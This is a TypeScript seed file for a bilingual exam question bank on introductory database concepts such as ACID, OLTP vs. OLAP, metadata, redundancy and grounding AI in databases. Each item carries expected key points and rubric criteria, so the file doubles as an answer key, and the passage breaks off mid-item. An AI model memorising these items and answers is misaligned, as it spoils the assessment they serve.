import { LectureId, QuestionGroup, DifficultyBand } from '../types/exam';

export interface FamilySeed {
  family_suffix: string;
  lecture_ids: LectureId[];
  question_group: QuestionGroup;
  topic: string;
  learning_objective: string;
  variants: [VariantSeed, VariantSeed];
}

export interface VariantSeed {
  difficulty_band: DifficultyBand;
  approved_by_default: boolean;
  prompt_en: string;
  prompt_vi: string;
  context: string;
  optional_table_or_diagram?: string | null;
  optional_sql?: string | null;
  expected_key_points: string[];
  acceptable_alternatives: string[];
  common_misconceptions: string[];
  optional_follow_up: string;
  rubric_specifics: {
    accuracy_full: string;
    reasoning_full: string;
    application_full: string;
  };
}

export const LECTURES_01_TO_04_SEEDS: FamilySeed[] = [
  // ============================================================================
  // LECTURE 01: Data, Databases and AI-Powered Decisions (15 Group A + 15 Group B families = 60 questions)
  // ============================================================================
  {
    family_suffix: 'L01_A01_DATA_VS_INFO',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Raw Data vs. Actionable Information',
    learning_objective: 'Distinguish raw transactional facts from contextualized business information',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'At CampusMart, the POS terminal records the number "42000" and timestamp "2026-10-12 08:15". Explain why these raw values are considered data rather than information, and show how transforming them produces actionable information for the store manager.',
        prompt_vi: 'Tại CampusMart, máy POS ghi nhận con số "42000" và mốc thời gian "2026-10-12 08:15". Hãy giải thích vì sao các giá trị thô này là dữ liệu (data) chứ chưa phải thông tin (information), và chỉ ra cách biến đổi chúng thành thông tin phục vụ ra quyết định cho quản lý cửa hàng.',
        context: 'CampusMart POS checkout operations during morning rush hour.',
        expected_key_points: [
          'Raw data ("42000", timestamp) are isolated facts without business context or meaning on their own.',
          'Information is produced when data is contextualized, structured, or aggregated (e.g., 42,000 VND unit price of a CampusMart notebook sold at 8:15 AM, contributing to a 18% morning sales spike).',
          'Actionable decision: manager uses the aggregated morning trend to schedule an extra cashier between 8:00 and 9:00 AM.',
        ],
        acceptable_alternatives: [
          'Students may illustrate using coffee shop cup counts vs hourly peak revenue chart.',
        ],
        common_misconceptions: [
          'Claiming that storing raw numbers inside a database table automatically turns them into business information without context or query interpretation.',
        ],
        optional_follow_up: 'If an AI assistant summarizes those numbers without knowing the currency unit (VND vs USD), what risk arises?',
        rubric_specifics: {
          accuracy_full: 'Defines raw data vs contextualized information accurately with clear distinction.',
          reasoning_full: 'Explains the transformation pipeline (adding schema metadata, unit, and aggregation).',
          application_full: 'Provides a concrete CampusMart staffing or restocking decision.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'A student internship coordinator exports 500 unlabelled CSV cells containing numbers between 1 and 5. Why can an AI model not make a valid placement decision from these values alone, and what metadata is required to turn this dataset into information?',
        prompt_vi: 'Điều phối viên thực tập xuất ra 500 ô CSV không có tiêu đề chứa các số từ 1 đến 5. Tại sao mô hình AI không thể đưa ra quyết định phân bổ thực tập hợp lệ chỉ từ các con số này, và cần bổ sung metadata nào để biến tập dữ liệu thành thông tin?',
        context: 'University Internship Hub evaluation dataset.',
        expected_key_points: [
          'Without column definitions, scale direction (1=best vs 5=best), and entity links (student_id, company_id), numbers 1–5 are ambiguous raw symbols.',
          'Metadata provides semantics: attribute name, scale meaning, observation date, and rater role.',
          'Feeding uncontextualized numbers to an AI causes hallucinated rankings.',
        ],
        acceptable_alternatives: [
          'Discussing data dictionary / schema catalog as the bridge from raw values to usable information.',
        ],
        common_misconceptions: [
          'Believing that large language models can automatically infer whether 1 or 5 is the highest rating without metadata.',
        ],
        optional_follow_up: 'Name two specific columns you would add to make each rating auditable.',
        rubric_specifics: {
          accuracy_full: 'Identifies missing semantic metadata and scale definition.',
          reasoning_full: 'Explains why AI pattern-matching fails when domain semantics are absent.',
          application_full: 'Specifies concrete metadata fields (student_id, rubric_scale, evaluator_id).',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A02_SPREADSHEET_VS_DBMS',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Spreadsheets vs. Relational DBMS',
    learning_objective: 'Explain why multi-user business operations outgrow shared spreadsheets',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'CampusMart currently tracks inventory and daily sales in a shared Excel file edited simultaneously by three cashiers. Explain two concrete operational failures that a relational DBMS prevents compared to this shared spreadsheet.',
        prompt_vi: 'CampusMart đang theo dõi tồn kho và bán hàng hằng ngày trên một file Excel dùng chung cho ba thu ngân cùng sửa. Hãy giải thích hai sự cố vận hành cụ thể mà hệ quản trị CSDL quan hệ (RDBMS) ngăn chặn được so với bảng tính dùng chung này.',
        context: 'CampusMart transition from shared spreadsheets to a relational database.',
        expected_key_points: [
          'Concurrency control / lost updates: two cashiers deducting stock at the same time in a spreadsheet can overwrite each other; RDBMS uses ACID transactions and row locking.',
          'Data integrity & type enforcement: spreadsheets allow accidental text in numeric price cells or deleting rows without foreign key checks.',
          'Granular access control and audit trails per user action.',
        ],
        acceptable_alternatives: [
          'Highlighting redundant copy-pasted customer info across tabs leading to update anomalies.',
        ],
        common_misconceptions: [
          'Saying Excel cannot store more than 100 rows (modern spreadsheets hold 1M+ rows; the core issue is integrity, concurrency, and relational constraints).',
        ],
        optional_follow_up: 'When is a spreadsheet still an appropriate tool for a CampusMart analyst?',
        rubric_specifics: {
          accuracy_full: 'Identifies concurrency/locking and integrity constraints accurately.',
          reasoning_full: 'Explains how simultaneous edits or unvalidated cells corrupt business state.',
          application_full: 'Connects directly to CampusMart cashier stock deduction or price lookup.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'A campus coffee shop owner says: "Google Sheets is already in the cloud, so it is a relational database." How would you clarify the architectural difference between a cloud spreadsheet and a relational DBMS?',
        prompt_vi: 'Chủ quán cà phê trong khuôn viên trường nói: "Google Sheets đã ở trên đám mây và nhiều người cùng mở được, vậy nó chính là cơ sở dữ liệu quan hệ." Bạn sẽ giải thích sự khác biệt bản chất giữa bảng tính đám mây và RDBMS như thế nào?',
        context: 'Small campus coffee shop evaluating data infrastructure.',
        expected_key_points: [
          'Cloud hosting only changes where the file lives, not the data model.',
          'A relational DBMS enforces strict schemas, primary/foreign key referential integrity, atomic multi-table transactions, and declarative SQL querying.',
          'In a cloud sheet, any collaborator can accidentally drag-fill over a formula or break a VLOOKUP reference.',
        ],
        acceptable_alternatives: [
          'Comparing cell-based addressing (A1:B10) with set-based relational tuples and constraints.',
        ],
        common_misconceptions: [
          'Equating "stored online" with "relational database architecture".',
        ],
        optional_follow_up: 'Give one example of a referential integrity rule a coffee shop needs between Orders and MenuItems.',
        rubric_specifics: {
          accuracy_full: 'Distinguishes cloud file collaboration from relational schema + ACID enforcement.',
          reasoning_full: 'Contrasts cell coordinates/formulas with relational keys and constraints.',
          application_full: 'Provides a concrete coffee shop menu/order integrity example.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A03_OLTP_VS_OLAP',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Operational (OLTP) vs. Analytical (OLAP) Workloads',
    learning_objective: 'Distinguish day-to-day transaction processing from historical analytical reporting',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'Contrast an operational database workload (OLTP) with an analytical workload (OLAP) at CampusMart. Why is running a heavy 3-year seasonal trend query directly on the live checkout database at 12:00 PM risky?',
        prompt_vi: 'Hãy phân biệt tác vụ CSDL vận hành (OLTP) với tác vụ phân tích (OLAP) tại CampusMart. Tại sao việc chạy một truy vấn tổng hợp xu hướng 3 năm trực tiếp trên CSDL thanh toán lúc 12 giờ trưa lại gây rủi ro?',
        context: 'CampusMart checkout performance vs quarterly merchandising analysis.',
        expected_key_points: [
          'OLTP handles high-frequency, short, atomic transactions (insert order, update stock) requiring millisecond response.',
          'OLAP scans millions of historical rows for aggregations and trend analysis.',
          'Running heavy analytical scans on live OLTP during peak hours causes resource contention (CPU/I/O/locks) and slows down customer checkout.',
        ],
        acceptable_alternatives: [
          'Explaining read-replica or data warehouse separation for reporting.',
        ],
        common_misconceptions: [
          'Thinking OLAP is used to process individual customer barcode scans at the register.',
        ],
        optional_follow_up: 'How often does the merchandising dashboard actually need to refresh compared to the POS stock counter?',
        rubric_specifics: {
          accuracy_full: 'Clearly contrasts OLTP (fast writes/point reads) vs OLAP (large historical scans).',
          reasoning_full: 'Explains lock/CPU/I/O contention during peak checkout hours.',
          application_full: 'Relates to CampusMart noon rush vs management reporting cadence.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In an internship management system, classify these two operations as operational or analytical and justify your classification: (1) registering a student’s signed internship contract, and (2) comparing 5-year placement rates across majors.',
        prompt_vi: 'Trong hệ thống quản lý thực tập, hãy phân loại hai tác vụ sau thành vận hành (OLTP) hay phân tích (OLAP) và giải thích lý do: (1) ghi nhận hợp đồng thực tập vừa ký của một sinh viên, và (2) so sánh tỷ lệ có việc làm sau thực tập trong 5 năm qua giữa các ngành học.',
        context: 'University Career & Internship Center.',
        expected_key_points: [
          'Operation (1) is OLTP: single-student record insertion/update requiring immediate consistency.',
          'Operation (2) is OLAP: multi-year historical aggregation across cohorts and departments.',
          'They differ in data volume touched, latency expectations, and update frequency.',
        ],
        acceptable_alternatives: [
          'Discussing normalized design for (1) vs aggregated summary tables for (2).',
        ],
        common_misconceptions: [
          'Classifying any query that uses a database as OLAP regardless of scope.',
        ],
        optional_follow_up: 'Which of the two operations must never lose a single committed row?',
        rubric_specifics: {
          accuracy_full: 'Correctly classifies (1) as OLTP and (2) as OLAP.',
          reasoning_full: 'Justifies by row scope, write vs read pattern, and historical horizon.',
          application_full: 'Links to student contract accuracy vs curriculum planning.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A04_AI_GROUNDING_DB',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Role of Structured Databases in Grounding AI',
    learning_objective: 'Explain why LLMs need structured database grounding for factual business questions',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'Why can a general-purpose Large Language Model (LLM) not reliably answer "How many HDMI cables are currently in stock at CampusMart?" without querying a database, and how does database grounding solve this?',
        prompt_vi: 'Tại sao một mô hình ngôn ngữ lớn (LLM) đa dụng không thể trả lời đáng tin cậy câu hỏi "Hiện tại CampusMart còn bao nhiêu cáp HDMI trong kho?" nếu không truy vấn CSDL, và cơ chế grounding vào CSDL giải quyết việc này như thế nào?',
        context: 'CampusMart customer support chatbot integration.',
        expected_key_points: [
          'LLMs are trained on static historical text and have no native awareness of private, real-time operational state.',
          'Without database grounding, the LLM will either guess (hallucinate a plausible number) or refuse.',
          'Grounding (via Text-to-SQL or tool call) fetches the authoritative live stock count from the database before generating the response.',
        ],
        acceptable_alternatives: [
          'Describing RAG / function calling where the DB is the single source of truth.',
        ],
        common_misconceptions: [
          'Assuming that fine-tuning an LLM once a month is sufficient to track live retail inventory.',
        ],
        optional_follow_up: 'Even when the AI queries the database, why should the application verify the SKU filter it used?',
        rubric_specifics: {
          accuracy_full: 'Identifies LLM static training cutoff vs live private operational state.',
          reasoning_full: 'Explains how grounding retrieves deterministic facts from the RDBMS.',
          application_full: 'Addresses real-time inventory changes at CampusMart.',
        },
      },
      {
        difficulty_band: 'ADVANCED',
        approved_by_default: false,
        prompt_en: 'Distinguish between an AI hallucinating a fact out of thin air and an AI returning a wrong business answer because it queried the wrong database column. How does a clear database schema help prevent the second problem?',
        prompt_vi: 'Hãy phân biệt giữa việc AI "ảo giác" (hallucinate) tự bịa ra số liệu với việc AI trả lời sai câu hỏi kinh doanh do truy vấn nhầm cột trong CSDL. Một lược đồ CSDL (schema) rõ ràng giúp ngăn ngừa lỗi thứ hai như thế nào?',
        context: 'AI-assisted business analytics at CampusMart.',
        expected_key_points: [
          'Pure hallucination fabricates numbers without data backing; schema misinterpretation queries real numbers from the wrong attribute (e.g., `list_price` instead of `paid_amount`).',
          'Ambiguous column names like `val1`, `price2`, or `status_flag` confuse both human analysts and Text-to-SQL models.',
          'Descriptive column names, constraints, and data dictionary comments guide the AI to select the right column.',
        ],
        acceptable_alternatives: [
          'Mentioning semantic layers or curated views for AI agents.',
        ],
        common_misconceptions: [
          'Thinking that if a number comes from a SQL query, the business answer is guaranteed to be semantically right.',
        ],
        optional_follow_up: 'Give an example of an ambiguous column name in an Orders table and how to rename it.',
        rubric_specifics: {
          accuracy_full: 'Clearly separates fabrication from semantic column mismatch.',
          reasoning_full: 'Explains how unambiguous schema naming constrains AI query generation.',
          application_full: 'Provides a concrete column naming improvement.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A05_METADATA_CATALOG',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Metadata and Data Dictionaries',
    learning_objective: 'Explain the role of metadata in database understanding and governance',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'What is "metadata" in a relational database? Give three concrete examples of metadata for the `Products` table at CampusMart and explain why an analyst needs them.',
        prompt_vi: 'Metadata (siêu dữ liệu) trong cơ sở dữ liệu quan hệ là gì? Hãy nêu 3 ví dụ cụ thể về metadata của bảng `Products` tại CampusMart và giải thích vì sao chuyên viên phân tích cần chúng.',
        context: 'CampusMart database documentation.',
        expected_key_points: [
          'Metadata is "data about data" that describes structure, types, constraints, and business definitions.',
          'Examples: column name (`unit_price_vnd`), data type (`INTEGER` / `DECIMAL(12,2)`), nullable status (`NOT NULL`), key constraints (`PRIMARY KEY`), and unit currency description.',
          'Analysts need metadata to avoid misinterpreting units, null meanings, or join keys.',
        ],
        acceptable_alternatives: [
          'Including table row counts, last-updated timestamps, or foreign key definitions.',
        ],
        common_misconceptions: [
          'Giving actual product rows like "Casio Calculator, 450,000 VND" as examples of metadata (those are data instances, not metadata).',
        ],
        optional_follow_up: 'Is the value "450000" stored in row 5 data or metadata? Why?',
        rubric_specifics: {
          accuracy_full: 'Correctly defines metadata and gives 3 valid schema/catalog examples.',
          reasoning_full: 'Clearly separates schema description from row instance values.',
          application_full: 'Explains how CampusMart analysts use metadata to write valid queries.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'When onboarding a new data analyst or configuring an AI query assistant for a small retail business, why is a Data Dictionary indispensable even if all tables already exist in SQLite?',
        prompt_vi: 'Khi hướng dẫn một chuyên viên phân tích mới hoặc cấu hình trợ lý truy vấn AI cho doanh nghiệp bán lẻ nhỏ, tại sao Từ điển dữ liệu (Data Dictionary) vẫn không thể thiếu dù toàn bộ bảng đã tồn tại trong SQLite?',
        context: 'Small business analytics onboarding.',
        expected_key_points: [
          'SQLite DDL shows technical types (`TEXT`, `INTEGER`) but not business rules (e.g., what `status = 3` means or whether `amount` includes VAT).',
          'A Data Dictionary documents business definitions, allowed domain codes, calculation formulas, and owner stewardship.',
          'Prevents inconsistent KPI definitions across reports.',
        ],
        acceptable_alternatives: [
          'Giving examples of cryptic status codes (`A`, `P`, `X`) that SQLite schema alone cannot explain.',
        ],
        common_misconceptions: [
          'Believing `PRAGMA table_info` or `CREATE TABLE` statements contain all business meaning.',
        ],
        optional_follow_up: 'What business rule about `discount_Amount` would you record in the Data Dictionary?',
        rubric_specifics: {
          accuracy_full: 'Contrasts technical DDL types with business domain semantics.',
          reasoning_full: 'Explains how undocumented status codes or tax rules lead to reporting errors.',
          application_full: 'Provides a concrete retail example (VAT inclusion or order status code).',
        },
      },
    ],
  },
  // L01_A06 to L01_A15 (10 more Group A families for Lecture 01)
  {
    family_suffix: 'L01_A06_STRUCTURED_UNSTRUCTURED',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Structured, Semi-Structured, and Unstructured Data',
    learning_objective: 'Classify business data formats and their storage implications',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'CampusMart collects: (1) POS checkout line items, (2) supplier invoice JSON payloads, and (3) customer complaint voice recordings. Classify each as structured, semi-structured, or unstructured data, and explain which belongs in relational tables.',
        prompt_vi: 'CampusMart thu thập: (1) dòng hàng thanh toán POS, (2) gói dữ liệu JSON hóa đơn nhà cung cấp, và (3) file ghi âm phàn nàn của khách hàng. Hãy phân loại từng nguồn theo cấu trúc dữ liệu và giải thích nguồn nào phù hợp lưu trực tiếp trong bảng quan hệ.',
        context: 'CampusMart multi-source data architecture.',
        expected_key_points: [
          '(1) POS line items: Structured — fixed columns and strict data types, ideal for relational tables.',
          '(2) Supplier JSON payloads: Semi-structured — self-describing tags/keys with flexible nested fields.',
          '(3) Voice recordings: Unstructured — raw audio binary without predefined relational attributes (though transcripts/metadata can be extracted into tables).',
        ],
        acceptable_alternatives: ['Mentioning storing file paths + extracted structured tags for audio in RDBMS.'],
        common_misconceptions: ['Calling JSON unstructured (JSON has explicit hierarchy and key-value delimiters, so it is semi-structured).'],
        optional_follow_up: 'How can AI help bridge unstructured voice complaints into a structured database table?',
        rubric_specifics: {
          accuracy_full: 'Correctly classifies all three sources.',
          reasoning_full: 'Explains why JSON is semi-structured and POS rows are structured.',
          application_full: 'Shows how extracted attributes from complaints can link to CampusMart orders.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In an internship management portal, students upload PDF resumes and fill out a registration form (StudentID, GPA, Major). Why should we not store only the PDF resumes if we want to filter candidates with GPA >= 3.2?',
        prompt_vi: 'Trong cổng quản lý thực tập, sinh viên vừa tải lên CV bản PDF vừa điền biểu mẫu đăng ký (MSSV, GPA, Ngành học). Tại sao chúng ta không nên chỉ lưu mỗi file PDF nếu muốn lọc danh sách ứng viên có GPA >= 3.2?',
        context: 'University Internship Portal design.',
        expected_key_points: [
          'PDF files are unstructured documents with inconsistent layouts and formatting.',
          'Querying `WHERE gpa >= 3.2` requires structured numeric attributes in a relational column.',
          'Relying on AI/OCR extraction at query time is slow, costly, and prone to parsing errors.',
        ],
        acceptable_alternatives: ['Explaining hybrid storage: structured columns for filtering + object storage link for the PDF.'],
        common_misconceptions: ['Assuming SQL `WHERE` clauses can natively parse arbitrary PDF layouts with 100% accuracy.'],
        optional_follow_up: 'Where should the PDF file itself be stored relative to the student row?',
        rubric_specifics: {
          accuracy_full: 'Contrasts unstructured PDF parsing with structured relational indexing/filtering.',
          reasoning_full: 'Explains determinism, speed, and accuracy of structured numeric columns.',
          application_full: 'Proposes storing GPA as a numeric column plus a file URL/path to the PDF.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A07_DATA_REDUNDANCY_ANOMALY',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Data Redundancy and Inconsistency',
    learning_objective: 'Explain how uncontrolled data duplication leads to conflicting business truths',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'What is uncontrolled data redundancy? If a supplier’s phone number is typed into every single product row at CampusMart (150 products from the same supplier), what goes wrong when that supplier changes their phone number?',
        prompt_vi: 'Dư thừa dữ liệu (data redundancy) mất kiểm soát là gì? Nếu số điện thoại của nhà cung cấp được gõ lặp lại vào từng dòng sản phẩm tại CampusMart (150 sản phẩm cùng nhà cung cấp), chuyện gì sẽ xảy ra khi nhà cung cấp đổi số điện thoại?',
        context: 'CampusMart supplier & product catalog management.',
        expected_key_points: [
          'Data redundancy is storing the same piece of fact in multiple places unnecessarily.',
          'Update anomaly: updating 148 rows and missing 2 rows creates data inconsistency (two different phone numbers for the same supplier).',
          'Staff and AI assistants will no longer know which phone number is trustworthy.',
        ],
        acceptable_alternatives: ['Also mentioning insertion and deletion anomalies in flat files.'],
        common_misconceptions: ['Thinking redundancy only wastes disk space (storage is cheap; inconsistency is the real business danger).'],
        optional_follow_up: 'How should CampusMart structure Suppliers and Products so the phone number is stored only once?',
        rubric_specifics: {
          accuracy_full: 'Defines redundancy and identifies update anomaly / data inconsistency.',
          reasoning_full: 'Explains why partial updates destroy single source of truth.',
          application_full: 'Proposes separating `Suppliers` and referencing `supplier_id` in `Products`.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Is every duplicate value in a database considered harmful redundancy? Explain why repeating `customer_id = "CUST_09"` across 12 rows in the `Orders` table is necessary, whereas repeating `customer_email` across those 12 rows is harmful.',
        prompt_vi: 'Có phải mọi giá trị lặp lại trong CSDL đều là dư thừa có hại không? Hãy giải thích vì sao việc lặp lại `customer_id = "CUST_09"` trên 12 dòng trong bảng `Orders` là cần thiết, trong khi lặp lại `customer_email` trên 12 dòng đó lại có hại.',
        context: 'Relational linking vs non-key attribute duplication.',
        expected_key_points: [
          'Repeating a foreign key (`customer_id`) is required to link multiple orders to the same customer.',
          'Repeating a mutable non-key attribute (`customer_email`) creates update anomalies when the customer updates their email.',
          'Foreign keys are immutable identifiers glueing tables together; descriptive attributes belong in one home table.',
        ],
        acceptable_alternatives: ['Contrasting controlled relational key references with uncontrolled attribute duplication.'],
        common_misconceptions: ['Claiming that a normalized database has zero repeated values of any kind, even foreign keys.'],
        optional_follow_up: 'What happens if `customer_email` changes and we only update 5 of the 12 order rows?',
        rubric_specifics: {
          accuracy_full: 'Distinguishes necessary foreign key repetition from harmful attribute redundancy.',
          reasoning_full: 'Explains mutability and update anomaly risk on descriptive columns.',
          application_full: 'Applies clearly to `Customers` and `Orders`.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A08_SINGLE_SOURCE_OF_TRUTH',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Single Source of Truth (SSOT)',
    learning_objective: 'Explain why organizations need an authoritative database record',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'At CampusMart, the Marketing team keeps a customer list in Mailchimp, the Cashier team keeps another in POS, and Student Affairs keeps a third list. Why does this "data silo" setup cause problems during a campus-wide loyalty promotion?',
        prompt_vi: 'Tại CampusMart, nhóm Marketing giữ một danh sách khách hàng riêng, nhóm Thu ngân giữ một danh sách trong máy POS, và Phòng Công tác sinh viên giữ danh sách thứ ba. Tại sao tình trạng "ốc đảo dữ liệu" (data silos) này gây rắc rối khi triển khai chương trình tích điểm toàn trường?',
        context: 'CampusMart loyalty program integration.',
        expected_key_points: [
          'Data silos fragment customer identity across disconnected systems.',
          'The same student may have different emails, point balances, or opt-out flags in each silo.',
          'Establishing a Single Source of Truth (SSOT) ensures every department queries and updates one authoritative record.',
        ],
        acceptable_alternatives: ['Giving examples of mismatched loyalty points or sending spam to opted-out students.'],
        common_misconceptions: ['Thinking SSOT means deleting all other tools rather than synchronizing them to a master database record.'],
        optional_follow_up: 'What identifier should unify a student across CampusMart and University records?',
        rubric_specifics: {
          accuracy_full: 'Defines data silos and Single Source of Truth accurately.',
          reasoning_full: 'Explains how unsynchronized copies diverge over time.',
          application_full: 'Gives a concrete loyalty point or opt-out conflict scenario at CampusMart.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'When two department managers walk into a meeting with two different "Total Monthly Sales" numbers for the same coffee shop, how does a centralized database with standardized views resolve the dispute?',
        prompt_vi: 'Khi hai quản lý bộ phận bước vào cuộc họp với hai con số "Tổng doanh thu tháng" khác nhau của cùng một quán cà phê, một CSDL tập trung với các View chuẩn hóa sẽ giải quyết bất đồng này như thế nào?',
        context: 'Campus Coffee Shop management reporting.',
        expected_key_points: [
          'Discrepancies usually happen because each manager pulls from different local exports or applies different filters (e.g., including vs excluding cancelled orders).',
          'A centralized database stores all raw transactions once.',
          'A shared SQL View encodes the official business logic so both managers query the exact same definition.',
        ],
        acceptable_alternatives: ['Discussing auditability of cut-off timestamps and refund deductions.'],
        common_misconceptions: ['Blaming arithmetic mistakes in Excel when the root cause is inconsistent data snapshots and definitions.'],
        optional_follow_up: 'Name one filter condition that must be standardized in that official sales view.',
        rubric_specifics: {
          accuracy_full: 'Identifies divergent local snapshots and inconsistent filter definitions.',
          reasoning_full: 'Explains how shared database views enforce both data and logic consistency.',
          application_full: 'Mentions cancelled/refunded orders or timezone cutoffs.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A09_ACID_TRANSACTIONS',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Database Transactions and Atomicity',
    learning_objective: 'Explain why multi-step business events require atomic database transactions',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'When a student pays for an order at CampusMart using their Campus Wallet, the system must (1) deduct 85,000 VND from the student’s wallet and (2) mark the order as PAID. Explain what "Atomicity" means if the power goes out right after step (1).',
        prompt_vi: 'Khi sinh viên thanh toán đơn hàng tại CampusMart bằng Ví sinh viên, hệ thống phải (1) trừ 85.000đ trong ví và (2) cập nhật trạng thái đơn hàng thành ĐÃ THANH TOÁN. Hãy giải thích tính "Nguyên tử" (Atomicity) nghĩa là gì nếu mất điện ngay sau bước (1).',
        context: 'CampusMart e-wallet payment processing.',
        expected_key_points: [
          'Atomicity ("all or nothing") guarantees that all steps inside a transaction either complete together or none of them take effect.',
          'If power fails after step (1) before step (2) commits, the DBMS automatically rolls back step (1).',
          'This prevents the student from losing 85,000 VND while their order remains unpaid.',
        ],
        acceptable_alternatives: ['Describing `BEGIN TRANSACTION`, `COMMIT`, and `ROLLBACK`.'],
        common_misconceptions: ['Confusing Atomicity in transactions with atomic values in First Normal Form (1NF).'],
        optional_follow_up: 'Why is confusing transactional Atomicity with 1NF column atomicity a common student mistake?',
        rubric_specifics: {
          accuracy_full: 'Defines transactional Atomicity ("all or nothing") and rollback accurately.',
          reasoning_full: 'Traces the exact failure state between step 1 and step 2.',
          application_full: 'Explains how rollback protects the student wallet balance and CampusMart ledger.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In an internship allocation system, only 1 slot remains at TechCorp. Two students click "Claim Slot" at the exact same millisecond. How does a relational database prevent both students from being assigned the single remaining slot?',
        prompt_vi: 'Trong hệ thống đăng ký thực tập, công ty TechCorp chỉ còn đúng 1 suất trống. Hai sinh viên bấm "Đăng ký suất này" cùng một phần nghìn giây. CSDL quan hệ ngăn chặn việc cả hai cùng chiếm suất duy nhất đó bằng cách nào?',
        context: 'University Internship registration concurrency.',
        expected_key_points: [
          'Isolation and locking serialize concurrent transactions accessing the same slot counter.',
          'The first transaction locks/decrements `remaining_slots` from 1 to 0 and commits.',
          'The second transaction sees `remaining_slots = 0` (or fails a `CHECK (remaining_slots >= 0)` / unique constraint) and rolls back cleanly.',
        ],
        acceptable_alternatives: ['Explaining pessimistic locking or optimistic concurrency control with version checks.'],
        common_misconceptions: ['Assuming a frontend JavaScript disabled-button check is enough to stop race conditions from two different browsers.'],
        optional_follow_up: 'Why can client-side UI checks alone never prevent this race condition?',
        rubric_specifics: {
          accuracy_full: 'Identifies database transaction isolation / locking and check constraints.',
          reasoning_full: 'Explains why concurrent requests from two browsers bypass client-side state.',
          application_full: 'Traces the 1 -> 0 slot transition for TechCorp.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A10_HUMAN_IN_THE_LOOP_AI',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Human-in-the-Loop Verification for AI Decisions',
    learning_objective: 'Justify why high-stakes database actions require human verification',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'CampusMart deploys an AI replenishment assistant that analyzes sales data and suggests purchase orders to suppliers. Why should the store manager keep a "Human-in-the-Loop" approval step before the database actually submits a 50-million-VND supplier order?',
        prompt_vi: 'CampusMart triển khai trợ lý AI phân tích dữ liệu bán hàng để đề xuất đơn nhập hàng từ nhà cung cấp. Tại sao cửa hàng trưởng vẫn cần giữ bước duyệt "Human-in-the-Loop" trước khi hệ thống thực sự gửi đơn đặt hàng 50 triệu đồng?',
        context: 'AI-assisted inventory replenishment at CampusMart.',
        expected_key_points: [
          'Historical database sales do not capture external context unknown to the database (e.g., upcoming campus holiday, exam week closure, or a one-off club bulk purchase).',
          'An automated order based on a temporary spike could overstock perishable items and lock up cash.',
          'Human review combines database analytics with real-world domain judgment and accountability.',
        ],
        acceptable_alternatives: ['Discussing data glitches or promo anomalies misleading the AI forecast.'],
        common_misconceptions: ['Thinking AI makes errors only when SQL syntax is wrong, ignoring external context missing from the database.'],
        optional_follow_up: 'Give one real-world campus event that would make last week’s beverage sales a bad predictor for next week.',
        rubric_specifics: {
          accuracy_full: 'Explains the boundary between historical database patterns and unrecorded real-world context.',
          reasoning_full: 'Identifies financial/inventory risk of unverified automated execution.',
          application_full: 'Gives a realistic campus scenario (orientation festival, semester break).',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'An AI assistant analyzes student internship evaluations and recommends terminating a partner company from next semester’s list. What database evidence should the program director inspect before accepting the AI’s recommendation?',
        prompt_vi: 'Trợ lý AI phân tích dữ liệu đánh giá thực tập của sinh viên và khuyến nghị loại một doanh nghiệp đối tác khỏi danh sách học kỳ tới. Giám đốc chương trình cần kiểm tra những bằng chứng dữ liệu nào trong CSDL trước khi chấp nhận khuyến nghị của AI?',
        context: 'University Internship Partner review.',
        expected_key_points: [
          'Check sample size (did only 1 student rate them poorly, or 25 students?).',
          'Check data completeness and recency (were ratings from 4 years ago or this semester?).',
          'Read the underlying qualitative feedback text alongside the numeric average.',
        ],
        acceptable_alternatives: ['Checking whether a specific department or supervisor accounted for the low score.'],
        common_misconceptions: ['Blindly trusting an AI summary without checking the sample size (`COUNT`) behind an average (`AVG`).'],
        optional_follow_up: 'Why is an average rating of 2.0/5.0 from 1 student very different from 2.0/5.0 across 30 students?',
        rubric_specifics: {
